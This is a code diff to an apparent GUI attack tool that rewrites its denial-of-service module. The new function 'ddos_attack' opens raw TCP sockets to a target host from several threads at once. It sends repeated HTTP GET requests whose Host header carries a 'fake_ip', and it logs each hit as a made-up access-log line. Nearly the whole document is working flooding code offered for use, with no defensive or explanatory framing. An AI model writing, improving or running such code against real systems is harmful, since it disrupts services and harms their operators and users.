@@ -1,26 +1,64 @@
+import socket
 import threading
-import requests
+import time
+from urllib.parse import urlparse
+from datetime import datetime
 from gui.dos_attack.stopped_manager import is_stopped
-from gui.utils.console_view import ConsoleView
 
 
-def perform_dos(target_url, console_view: ConsoleView):
+def ddos_attack(target_url, fake_ip, console_view, callback=None, num_threads=10, delay=0.5):
+    # Parse the target URL
+    parsed_url = urlparse(target_url)
+    hostname = parsed_url.hostname
+    port = parsed_url.port if parsed_url.port else (443 if parsed_url.scheme == "https" else 80)
 
-    def send_request():
-        try:
-            response = requests.get(target_url)
-            console_view.add_text_schedule(f"[SUCCESS] Sent request, Status Code: {response.status_code}")
-        except Exception as e:
-            console_view.add_text_schedule(f"[ERROR] Request failed: {e}")
+    attack_num = 0
 
-    console_view.add_text_schedule(f"[INFO] Starting DoS attack on {target_url}. Press 'Stop Attack' to terminate.")
-
-    def attack_loop():
+    def attack():
+        nonlocal attack_num
         while not is_stopped():
-            thread = threading.Thread(target=send_request)
-            thread.start()
-            thread.join()
+            try:
+                # Create a socket
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((hostname, port))
 
-        console_view.add_text_schedule("[INFO] DoS attack stopped by the user.")
+                # Construct the HTTP GET request
+                request = f"GET / HTTP/1.1\r\nHost: {fake_ip}\r\n\r\n"
+                #console_view.add_text_schedule(f"[INFO] Sending Request: {request.strip()}")
+                s.send(request.encode('ascii'))
 
-    threading.Thread(target=attack_loop, daemon=True).start()
+                # Read the server's response
+                response = s.recv(4096).decode('ascii')
+
+                # Log response and increment attack count
+                attack_num += 1
+                timestamp = datetime.now().strftime("%d/%b/%Y %H:%M:%S")
+                log_line = f'{fake_ip} - - [{timestamp}] "GET / HTTP/1.1" 200 -'
+                console_view.add_text_schedule(f"[INFO] Response #{attack_num}: {log_line}")
+
+                # Call the callback with success
+                if callback:
+                    callback(success=True)
+
+                # Close the socket
+                s.close()
+
+                # Delay to control attack intensity
+                time.sleep(delay)
+            except Exception as e:
+                # Log the error
+                console_view.add_text_schedule(f"[ERROR] {e}")
+
+                # Call the callback with failure
+                if callback:
+                    callback(success=False)
+
+    # Launch multiple threads for the attack
+    threads = []
+    for _ in range(num_threads):
+        thread = threading.Thread(target=attack)
+        thread.start()
+        threads.append(thread)
+
+    for thread in threads:
+        thread.join()
